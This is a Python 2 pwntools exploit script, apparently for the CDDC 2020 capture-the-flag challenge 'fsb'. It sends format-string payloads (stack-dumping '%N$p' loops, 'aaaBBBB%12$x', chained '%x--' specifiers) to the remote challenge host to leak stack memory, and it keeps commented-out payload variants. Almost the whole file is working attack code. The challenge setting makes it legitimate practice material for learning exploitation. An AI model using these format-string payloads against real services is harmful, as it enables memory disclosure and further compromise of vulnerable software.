#!/usr/bin/env python

# Run in python 2
from pwn import *

def runNc(payload):
    conn = remote('fsb.chall.cddc2020.nshc.sg',30303)
    print(conn.recvuntil("?"))
    conn.send(payload + "\n")
    conn.interactive()
    
def showStack():
    payload = 'aaa'
    for i in range(1, 130):
        currline = "%{}$p".format(i)
        currline += ' '*(8-len(currline))
        payload += currline

    print(payload)
    runNc(payload)

    

#showStack()
#runNc("aaa%1$p")

runNc("aaaBBBB%12$x")
'''
exploit = 'aaaabbbb'+'%x--'*20
#'aaa\xf0\x9f\x90\x9b    %12$x'
#'aaa\x9b\x90\x9f\xf0    %12$x'#"A"*35

def runNetwork(exploit):
    conn = remote('fsb.chall.cddc2020.nshc.sg',30303)
    # Main menu
    data = conn.recvuntil("?")
    print(data)
    conn.send(exploit+"\n")
    conn.interactive()

runNetwork(exploit)
'''
"""
aaabbbb%s--%s--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--

# Start reading current byte
aaabbbb%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x--%x

aaabbbb%12$x

#
aaa\xf0\x9f\x90\x9b%11$x
"""
